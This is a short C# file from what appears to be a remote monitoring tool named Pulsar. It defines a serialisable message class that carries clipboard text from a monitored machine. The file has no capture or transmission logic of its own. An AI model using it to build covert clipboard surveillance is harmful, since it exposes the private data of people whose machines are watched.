using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Monitoring.Clipboard
{
    [MessagePackObject]
    public class SendClipboardData : IMessage
    {
        [Key(1)]
        public string ClipboardText { get; set; }
    }
}
